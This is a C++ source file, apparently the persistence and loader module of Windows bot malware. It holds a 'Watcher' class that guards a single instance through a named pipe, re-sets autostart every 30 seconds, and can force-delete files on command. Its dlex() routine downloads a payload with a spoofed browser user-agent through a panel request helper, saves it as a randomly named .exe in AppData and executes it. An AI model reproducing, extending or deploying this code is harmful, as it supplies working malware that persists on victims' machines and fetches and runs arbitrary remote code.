#include "Watcher.h"
#include "Base.h"
#include "MonitoringThread.h"

Watcher::Watcher()
{
	Base::instance()->getHWID(pipename);
	pipename = "\\\\.\\pipe\\spark" + pipename;

	pipe = NULL;
	hPipeThread = NULL;
}

Watcher *Watcher::instance()
{
	static Watcher *i = NULL;

	if (!i)
		i = new Watcher();

	return(i);
}

Watcher::~Watcher(void)
{
	if (pipe)
		CloseHandle(pipe);
}

bool Watcher::getPipe()
{
	if (!this->pipe) {
		HANDLE pipe = CreateNamedPipe(pipename.c_str(), PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 100, 100, 0, NULL);
		if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
			return(false);
		this->pipe = pipe;
	}
	return(true);
}

void __stdcall Watcher::watcherThread(Watcher *w)
{
	for (;;) {
		Sleep(30000);
		Base::instance()->setAutostart();
	}
}

void __stdcall Watcher::pipeThread(Watcher *w)
{
	for (;;) {
		HANDLE pipe = w->pipe;
		WORD rv, myv = Base::instance()->getNVersion();
		DWORD rd;
		WORD cmd;
		if (!ConnectNamedPipe(pipe, NULL)) {
			Sleep(1000);
			continue;
		}

		ReadFile(pipe, &cmd, sizeof(cmd), &rd, NULL);
		WriteFile(pipe, &myv, sizeof(myv), &rd, NULL);
		if (!cmd) {
			ReadFile(pipe, &rv, sizeof(rv), &rd, NULL);
			if (HIBYTE(rv) > HIBYTE(myv) || (HIBYTE(rv) == HIBYTE(myv) && LOBYTE(rv) > LOBYTE(myv))) {
				w->terminate();
				return;
			}
		} else {
			char file[MAX_PATH + 1];
			ReadFile(pipe, file, sizeof(file), &rd, NULL);
			file[MAX_PATH] = 0;
			log(LL_DIAG, L_NEW L_DEL L_COMMAND "%s", file);
			Sleep(6000);
			Base::instance()->forceDeleteFile(std::string(file));
		}
		
		DisconnectNamedPipe(pipe);
	}
}

void Watcher::initInstall()
{
	DWORD tid;
	for (int i = 0; i < 12; i++)
		if (getPipe())
			break;
		else
			Sleep(1200);

	if (!getPipe()) {
		DWORD rd;
		WORD rv, myv = Base::instance()->getNVersion();
		DWORD msg = myv;
		if (!CallNamedPipe(pipename.c_str(), &msg, sizeof(msg), &rv, sizeof(rv), &rd, 0)) {
			log(LL_ERROR, L_GETACALL L_PIPE L_FAIL "%s." L_FORCE, pipename.c_str());
			forceInstall();
		} else if (HIBYTE(rv) > HIBYTE(myv) || (HIBYTE(rv) == HIBYTE(myv) && LOBYTE(rv) >= LOBYTE(myv))) {
			log(LL_ERROR, L_CALLVER "%d.%d, " L_IAM "%d.%d." L_TERMINATE, HIBYTE(rv), LOBYTE(rv), HIBYTE(myv), LOBYTE(myv));
			terminate();
			return;
		}
	}

	if (!install())
		forceInstall();

	hPipeThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pipeThread, this, 0, &tid);
	if (!hPipeThread || hPipeThread == INVALID_HANDLE_VALUE) {
		hPipeThread = NULL;
		log(LL_ERROR, L_PIPE L_THREAD L_FAIL);
		Sleep(60000);

		restart();
	}

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)watcherThread, this, 0, &tid);

}

void Watcher::leavePipe()
{
	if (hPipeThread) {
		//CancelSynchronousIo(hPipeThread);
		TerminateThread(hPipeThread, 0);
		CloseHandle(hPipeThread);

		hPipeThread = NULL;
	}

	if (pipe)
		CloseHandle(pipe);

	pipe = NULL;
}

void Watcher::restart()
{
	char me[MAX_PATH + 1];
	leavePipe();
	GetModuleFileName(NULL, me, MAX_PATH);
	log(LL_DIAG, L_IAM L_RESTART "%s", me);
	Base::instance()->runProc(std::string(me));
	terminate();
}

void Watcher::terminate()
{
	leavePipe();
	Base::instance()->terminate();
}

bool Watcher::install()
{
	//return(true);


	DWORD rd;
	char msg[MAX_PATH + 2];
	std::string current;

	Base *b = Base::instance();
	if (b->isInstalled())
		return(true);
	if (!b->install())
		return(false);

	DisconnectNamedPipe(pipe);
	CloseHandle(pipe);
	pipe = NULL;

	*(WORD *)msg = 1;
	b->getCurrentPath(current);
	strcpy(msg + 2, current.c_str());
	Sleep(10000);
	//MessageBoxA(NULL, msg + 2, "send dcmd", MB_OK);
	WaitNamedPipe(pipename.c_str(), 10000);
	CallNamedPipe(pipename.c_str(), msg, sizeof(msg), NULL, 0, &rd, 0);
	terminate();
	return(true);
}

void Watcher::forceInstall()
{
	Base::instance()->forceInstall();
	install();
	terminate();
}

inline unsigned short Watcher::calcchk(const unsigned char *data, unsigned int len)
{
	unsigned short vchk = 0xdead;
	for (unsigned int i = 0; i < len; i++)
	if (i % 3)
		vchk += (data[i] * 2) % 0x3a;
	else
		vchk += data[i];

	return(vchk);
}

bool Watcher::download(std::string &url, std::string &file, unsigned short chksum)
{
	std::string uri;

	unsigned int rlen;
	unsigned char *resp;
	if (url.length() <= 7 || stricmp(url.substr(0, 7).c_str(), "http://"))
		goto urldl;

	size_t p;
	uri = url.substr(7);
	if ((p = uri.find('/')) == std::string::npos)
		goto urldl;

	char *host = new char[p + 1];
	if (!host)
		goto urldl;

	strncpy(host, uri.c_str(), p);
	host[p] = 0;

	unsigned int pathlen = uri.length() - p;
	char *path = new char[pathlen + 1];
	if (!path) {
		delete[] host;
		goto urldl;
	}

	strncpy(path, &uri.c_str()[p], pathlen);
	path[pathlen] = 0;

	unsigned int rc = PanelRequest::httpRequest(host, path, 80,
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, "
		"like Gecko) Chrome/25.0.1364.152 Safari/537.22", NULL, 0,
		(char **)&resp, &rlen);

	delete[] host;
	delete[] path;

	if (!resp || !rlen) {
		log(LL_ERROR, L_DLEX L_ON L_HTTPREQ L_FAIL L_LEN "= %d, " L_CHKSUM "= 0x%x." L_FALLBACK, rlen, chksum);
		goto urldl;
	}

	if (!chksum)
		goto dumpp;

	unsigned short vchk = calcchk(resp, rlen);

	if (vchk != chksum) {
		delete[] resp;
		log(LL_ERROR, L_VERIFY L_CHKSUM L_FAIL L_SHOULD "0x%x," L_IS "0x%x." L_FALLBACK, chksum, vchk);
		goto urldl;
	}

dumpp:
	HANDLE dF = CreateFileA(file.c_str(), GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (!dF || dF == INVALID_HANDLE_VALUE) {
		log(LL_ERROR, L_CFA L_FAIL L_FALLBACK);
		delete[] resp;
		goto urldl;
	}

	DWORD wlen;
	if (!WriteFile(dF, resp, rlen, &wlen, NULL) || wlen != rlen) {
		log(LL_ERROR, L_WRITEF L_FAIL L_WROTE "= 0x%x, " L_LEN "= 0x%x." L_FALLBACK, wlen, rlen);
		delete[] resp;
		goto urldl;
	}

	delete[] resp;
	CloseHandle(dF);

	log(LL_DIAG, L_DLEX L_SUCCESS "%s -> %s [%d]" L_CHKSUM "= 0x%x (== 0x%x)", url.c_str(), file.c_str(), rlen, chksum, vchk);
	
	return(true);

urldl:
	if (URLDownloadToFileA(NULL, url.c_str(), file.c_str(), 0, NULL) != S_OK) {
		log(LL_ERROR, L_URLDLTF L_FAIL);
		return(false);
	}
	
	Sleep(30000);

	if (chksum) {
		HANDLE hF = CreateFileA(file.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (!hF || hF == INVALID_HANDLE_VALUE) {
			log(LL_ERROR, L_FAIL L_TO L_OPEN L_URLDLTF L_FILE);
			return(false);
		}

		DWORD rd,
			fs = GetFileSize(hF, NULL);
		unsigned char *data = new unsigned char[fs];

		if (!ReadFile(hF, data, fs, &rd, NULL) || rd != fs) {
			log(LL_ERROR, L_FAIL L_READ L_FILE);
			delete[] data;
			CloseHandle(hF);
			return(false);
		}
		CloseHandle(hF);

		vchk = calcchk(data, fs);
		delete[] data;

		if (vchk != chksum) {
			log(LL_ERROR,  L_VERIFY L_CHKSUM L_FAIL L_SHOULD "0x%x," L_IS "0x%x.", chksum, vchk);
			return(false);
		}
	}

	return(true);
}

bool Watcher::dlex(std::string &url, unsigned short chksum, bool term)
{
	std::string adpath;
	Base::instance()->getADPath(adpath);
	adpath += '\\';
	for (int i = 0; i < 10; i++)
		adpath += ('A' + rand() % 26);
	adpath += ".exe";

	if (!download(url, adpath, chksum))
		return(false);

	if (!Base::instance()->runProc(adpath))
		return(false);

	if (term)
		terminate();

	return(true);
}
